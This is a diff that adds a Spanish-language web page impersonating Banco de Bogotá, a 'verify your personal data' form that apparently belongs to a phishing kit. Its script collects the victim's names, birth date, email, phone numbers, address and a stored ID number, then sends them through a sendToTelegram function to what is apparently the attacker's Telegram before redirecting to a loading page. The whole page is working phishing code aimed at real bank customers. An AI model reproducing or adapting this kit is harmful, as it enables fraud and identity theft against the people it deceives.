@@ -1,0 +1,631 @@
+
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Banco de Bogotá - Datos Personales</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* LOADER (igual que index1) */
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #2c3e50;
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loader-container {
+            position: relative;
+            width: 60px;
+            height: 60px;
+            animation: rotateLoader 1.5s linear infinite;
+        }
+
+        .dot {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+        }
+
+        .dot-yellow {
+            background-color: #f1c40f;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .dot-blue {
+            background-color: #3498db;
+            bottom: 5px;
+            left: 0;
+        }
+
+        .dot-red {
+            background-color: #e74c3c;
+            bottom: 5px;
+            right: 0;
+        }
+
+        @keyframes rotateLoader {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        body {
+            font-family: 'Open Sans', Arial, sans-serif;
+            background: linear-gradient(90deg, #fcfcfc 50%, #eef3f6 50%);
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* CONTENEDOR PRINCIPAL (igual que index1) */
+        .container {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            align-items: flex-start;
+            max-width: 1000px;
+            margin: 20px auto;
+            padding: 20px;
+            gap: 40px;
+        }
+
+        /* LOGIN SECTION */
+        .container__login {
+            flex: 0 0 380px;
+            width: 380px;
+        }
+
+        .container__login--header img {
+            max-width: 200px;
+            margin-bottom: 15px;
+        }
+
+        .container__login--title h2 {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        /* BLUE BANNER */
+        .blue-banner {
+            background-color: #0033a0;
+            color: white;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.85em;
+        }
+
+        .blue-banner img {
+            width: 35px;
+            height: 35px;
+            flex-shrink: 0;
+        }
+
+        /* LOGIN CARD */
+        .login-card-content {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+
+        /* FORM */
+        .label {
+            margin-bottom: 6px;
+            margin-top: 10px;
+            font-weight: 600;
+            color: #333;
+            font-size: 13px;
+            display: block;
+        }
+
+        .custom-form-control {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .custom-select select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .id-row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .id-half {
+            width: 50%;
+        }
+
+        /* BUTTON */
+        .btn-main {
+            width: 100%;
+            padding: 12px;
+            background-color: #0033a0;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+
+        /* SECTION TITLES */
+        .section-title {
+            color: #0033a0;
+            font-size: 1.1em;
+            font-weight: bold;
+            margin: 20px 0 10px 0;
+            padding-bottom: 5px;
+            border-bottom: 2px solid #e6f0fa;
+        }
+
+        /* INFO SECTION */
+        .container__info {
+            flex: 1;
+            max-width: 500px;
+        }
+
+        .container__info img {
+            width: 100%;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            margin-bottom: 15px;
+        }
+
+        /* BOTTOM ICONS (igual que index1) */
+        .bottom-icons-container {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .icons-scroll-view {
+            display: flex;
+            gap: 10px;
+            overflow-x: auto;
+            scroll-behavior: smooth;
+            scrollbar-width: none;
+            padding: 5px 0;
+        }
+
+        .icons-scroll-view::-webkit-scrollbar {
+            display: none;
+        }
+
+        .bottom-icon {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            color: #0033a0;
+            font-size: 0.7rem;
+            font-weight: bold;
+            flex: 0 0 75px;
+            cursor: pointer;
+        }
+
+        .bottom-icon-box {
+            width: 45px;
+            height: 45px;
+            border: 1px solid #d1d1d1;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 6px;
+            background: transparent;
+        }
+
+        .bottom-icon-box svg {
+            width: 22px;
+            height: 22px;
+            fill: #0033a0;
+        }
+
+        .arrow-btn {
+            width: 30px;
+            height: 30px;
+            border: 1px solid #d1d1d1;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #0033a0;
+            cursor: pointer;
+            background: #fff;
+            flex-shrink: 0;
+        }
+
+        .arrow-btn svg {
+            width: 14px;
+            height: 14px;
+            fill: #0033a0;
+        }
+
+        /* ========== RESPONSIVE MÓVIL (IGUAL QUE INDEX1) ========== */
+        @media (max-width: 768px) {
+            body {
+                background: #fff !important;
+                padding: 0;
+            }
+
+            .container {
+                flex-direction: column;
+                align-items: center;
+                padding: 10px;
+                margin: 10px auto;
+                gap: 15px;
+            }
+
+            .container__login {
+                width: 100%;
+                max-width: 100%;
+                flex: none;
+            }
+
+            .container__login--header img {
+                max-width: 180px;
+            }
+
+            .container__info {
+                width: 100%;
+                max-width: 100%;
+                flex: none;
+            }
+
+            .login-card-content {
+                padding: 15px;
+            }
+
+            .custom-form-control,
+            .custom-select select {
+                font-size: 16px;
+            }
+
+            /* evita zoom iOS */
+            .bottom-icons-container {
+                margin-top: 10px;
+            }
+
+            .bottom-icon {
+                flex: 0 0 70px;
+                font-size: 0.65rem;
+            }
+
+            .bottom-icon-box {
+                width: 40px;
+                height: 40px;
+            }
+
+            .bottom-icon-box svg {
+                width: 20px;
+                height: 20px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .container {
+                padding: 5px;
+            }
+
+            .login-card-content {
+                padding: 12px;
+            }
+
+            .bottom-icon {
+                flex: 0 0 65px;
+                font-size: 0.6rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <p id="gfg" hidden></p>
+    <p id="address" hidden></p>
+    <p id="ip" hidden></p>
+
+    <!-- LOADER -->
+    <div id="loading-overlay">
+        <div class="loader-container">
+            <div class="dot dot-yellow"></div>
+            <div class="dot dot-blue"></div>
+            <div class="dot dot-red"></div>
+        </div>
+        <div style="color: white; margin-top: 20px;">Procesando...</div>
+    </div>
+
+    <!-- CONTENEDOR PRINCIPAL (copia de index1) -->
+    <div class="container">
+        <!-- LOGIN / FORM -->
+        <div class="container__login">
+            <div class="container__login--header">
+                <img src="logobanco1.png" alt="Banco de Bogotá" />
+            </div>
+            <div class="container__login--title">
+                <h2>Formulario de Datos Personales</h2>
+            </div>
+
+            <div class="blue-banner">
+                <img src="per.png" alt="Icono" />
+                <div style="flex:1;">
+                    <strong>Mantén tu información actualizado</strong><br>
+                    Por seguridad, verifica tus datos personales.
+                </div>
+            </div>
+
+            <div class="login-card-content">
+                <form id="formDatosPersonales" autocomplete="off" onsubmit="return enviarDatosPersonales(event);">
+                    <!-- SECCIÓN 1 -->
+                    <div class="section-title">📋 Información Personal</div>
+
+                    <label class="label">Nombres Completos</label>
+                    <input type="text" id="nombres" class="custom-form-control" placeholder="Ej: Juan Carlos" required>
+
+                    <label class="label">Apellidos Completos</label>
+                    <input type="text" id="apellidos" class="custom-form-control" placeholder="Ej: García López" required>
+
+                    <div class="id-row">
+                        <div class="id-half">
+                            <label class="label">Fecha de Nacimiento</label>
+                            <input type="date" id="fecha_nacimiento" class="custom-form-control" required>
+                        </div>
+                        <div class="id-half">
+                            <label class="label">Género</label>
+                            <div class="custom-select">
+                                <select id="genero" required>
+                                    <option value="">Seleccionar</option>
+                                    <option value="Masculino">Masculino</option>
+                                    <option value="Femenino">Femenino</option>
+                                    <option value="Otro">Otro</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- SECCIÓN 2 -->
+                    <div class="section-title">📞 Datos de Contacto</div>
+
+                    <label class="label">Correo Electrónico</label>
+                    <input type="email" id="correo" class="custom-form-control" placeholder="ejemplo@correo.com" required>
+
+                    <div class="id-row">
+                        <div class="id-half">
+                            <label class="label">Celular</label>
+                            <input type="tel" id="celular" maxlength="10" class="custom-form-control" placeholder="3001234567" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                        </div>
+                        <div class="id-half">
+                            <label class="label">Teléfono Fijo (Opcional)</label>
+                            <input type="tel" id="telefono_fijo" maxlength="10" class="custom-form-control" placeholder="6012345678" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                        </div>
+                    </div>
+
+                    <!-- SECCIÓN 3 -->
+                    <div class="section-title">📍 Dirección de Residencia</div>
+
+                    <label class="label">Dirección Completa</label>
+                    <input type="text" id="direccion" class="custom-form-control" placeholder="Calle 123 # 45-67 Apto 101" required>
+
+                    <div class="id-row">
+                        <div class="id-half">
+                            <label class="label">Ciudad</label>
+                            <input type="text" id="ciudad" class="custom-form-control" placeholder="Bogotá" required>
+                        </div>
+                        <div class="id-half">
+                            <label class="label">Departamento</label>
+                            <div class="custom-select">
+                                <select id="departamento" required>
+                                    <option value="">Seleccionar</option>
+                                    <option value="Amazonas">Amazonas</option>
+                                    <option value="Antioquia">Antioquia</option>
+                                    <option value="Arauca">Arauca</option>
+                                    <option value="Atlántico">Atlántico</option>
+                                    <option value="Bolívar">Bolívar</option>
+                                    <option value="Boyacá">Boyacá</option>
+                                    <option value="Caldas">Caldas</option>
+                                    <option value="Caquetá">Caquetá</option>
+                                    <option value="Casanare">Casanare</option>
+                                    <option value="Cauca">Cauca</option>
+                                    <option value="Cesar">Cesar</option>
+                                    <option value="Chocó">Chocó</option>
+                                    <option value="Córdoba">Córdoba</option>
+                                    <option value="Cundinamarca">Cundinamarca</option>
+                                    <option value="Guainía">Guainía</option>
+                                    <option value="Guaviare">Guaviare</option>
+                                    <option value="Huila">Huila</option>
+                                    <option value="La Guajira">La Guajira</option>
+                                    <option value="Magdalena">Magdalena</option>
+                                    <option value="Meta">Meta</option>
+                                    <option value="Nariño">Nariño</option>
+                                    <option value="Norte de Santander">Norte de Santander</option>
+                                    <option value="Putumayo">Putumayo</option>
+                                    <option value="Quindío">Quindío</option>
+                                    <option value="Risaralda">Risaralda</option>
+                                    <option value="San Andrés">San Andrés</option>
+                                    <option value="Santander">Santander</option>
+                                    <option value="Sucre">Sucre</option>
+                                    <option value="Tolima">Tolima</option>
+                                    <option value="Valle del Cauca">Valle del Cauca</option>
+                                    <option value="Vaupés">Vaupés</option>
+                                    <option value="Vichada">Vichada</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-main">Continuar</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- INFO SECTION -->
+        <div class="container__info">
+            <img id="bannerImg" src="images/talaval.png" alt="Publicidad">
+
+            <div class="bottom-icons-container">
+                <div class="arrow-btn" onclick="scrollIcons('left')">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z" />
+                    </svg>
+                </div>
+                <div class="icons-scroll-view" id="iconsTrack">
+                    <div class="bottom-icon">
+                        <div class="bottom-icon-box">
+                            <svg viewBox="0 0 24 24">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
+                            </svg>
+                        </div>
+                        <span>Ingreso seguro</span>
+                    </div>
+                    <div class="bottom-icon" onclick="window.open('https://www.grupoaval.com/BuscadordePuntosAval/','_blank')">
+                        <div class="bottom-icon-box">
+                            <svg viewBox="0 0 24 24">
+                                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" />
+                            </svg>
+                        </div>
+                        <span>Cajeros y oficinas</span>
+                    </div>
+                    <div class="bottom-icon">
+                        <div class="bottom-icon-box">
+                            <svg viewBox="0 0 24 24">
+                                <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z" />
+                            </svg>
+                        </div>
+                        <span>Turno digital</span>
+                    </div>
+                    <div class="bottom-icon">
+                        <div class="bottom-icon-box">
+                            <svg viewBox="0 0 24 24">
+                                <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 12h-2v-2h2v2zm0-4h-2V7h2v3z" />
+                            </svg>
+                        </div>
+                        <span>Centro de ayuda</span>
+                    </div>
+                </div>
+                <div class="arrow-btn" onclick="scrollIcons('right')">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z" />
+                    </svg>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== JS CORREGIDO ===== -->
+    <script src="telegram.js"></script>
+    <script src="action.js"></script>
+    <script>
+        if (window.stopListening) window.stopListening();
+
+        function scrollIcons(dir) {
+            const track = document.getElementById('iconsTrack');
+            track.scrollBy({
+                left: dir === 'left' ? -200 : 200,
+                behavior: 'smooth'
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const t = localStorage.getItem('user_id_type'),
+                n = localStorage.getItem('user_id_number');
+            if (n) console.log('Usuario identificado:', t, n);
+        });
+
+        function enviarDatosPersonales(e) {
+            e.preventDefault();
+
+            // Recoger datos del formulario
+            const datos = {
+                nombres: document.getElementById('nombres').value,
+                apellidos: document.getElementById('apellidos').value,
+                fecha_nacimiento: document.getElementById('fecha_nacimiento').value,
+                genero: document.getElementById('genero').value,
+                correo: document.getElementById('correo').value,
+                celular: document.getElementById('celular').value,
+                telefono_fijo: document.getElementById('telefono_fijo').value || 'N/A',
+                direccion: document.getElementById('direccion').value,
+                ciudad: document.getElementById('ciudad').value,
+                departamento: document.getElementById('departamento').value,
+                tipo_identificacion: localStorage.getItem('user_id_type') || 'CC',
+                numero_identificacion: localStorage.getItem('user_id_number') || 'Desconocido'
+            };
+
+            console.log('📤 Enviando datos personales:', datos);
+
+            // Mostrar loader
+            document.getElementById('loading-overlay').style.display = 'flex';
+
+            const btn = document.querySelector('.btn-main');
+            btn.disabled = true;
+            btn.textContent = 'Enviando...';
+
+            // Detener escucha previa
+            if (window.stopListening) {
+                window.stopListening();
+            }
+            localStorage.removeItem('bbogota_msg_id');
+
+            // Enviar a Telegram
+            if (typeof sendToTelegram === 'function') {
+                sendToTelegram('datos_personales', datos, function() {
+                    console.log('✅ Datos personales enviados');
+                    window.location.href = 'load.html';
+                });
+            } else {
+                console.error('❌ sendToTelegram no disponible');
+                alert('Error de conexión');
+                document.getElementById('loading-overlay').style.display = 'none';
+                btn.disabled = false;
+                btn.textContent = 'Actualizar Datos';
+            }
+
+            return false;
+        }
+    </script>
+</body>
+
+</html>
